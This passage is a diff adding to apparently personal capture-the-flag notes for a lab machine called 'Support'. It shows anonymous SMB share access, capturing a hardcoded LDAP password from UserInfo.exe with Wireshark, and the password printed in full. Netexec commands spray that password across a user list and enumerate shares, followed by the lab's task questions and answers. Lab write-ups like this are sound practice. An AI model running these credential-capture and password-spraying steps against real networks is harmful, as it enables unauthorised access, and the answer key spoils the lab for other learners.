@@ -31,4 +31,33 @@ nvm, it's useless anyway so dont bother
 we can also see `support-tools` is also readable, so we can see its contents
 `smbclient -U anonymous //rhost/support-tools`
 
+---
+**getting LDAP credentials**
+install `mono` in your PC, if you dont have it yet, 
+go to `https://www.mono-project.com/docs/getting-started/install/linux/`
+after that, open wireshark and capture packets,
+and then run the binary using 
+`sudo wine UserInfo.exe`
+in wireshark, look for packet that says `bindRequest` and you can find the credential
 
+![[Pasted image 20250506180441.png]]
+
+**verify credential**
+check if other users uses the same password
+`nxc smb rhost -u users.txt -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --continue-on-success`
+
+use netexec to check ldap permission on shares
+`nxc smb rhost -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --shares`
+
+---
+<h3>QUESTIONS</h3>
+Task 1: How many shares is Support showing on SMB?
+`6`
+  
+Task 2: Which share is not a default share for a Windows domain controller?
+`support-tools`
+
+Task 3: Almost all of the files in this share are publicly available tools, but one is not. What is the name of that file?
+`UserInfo.exe.zip`
+
+Task 4: What is the hardcoded password used for LDAP in the `UserInfo.exe` binary?
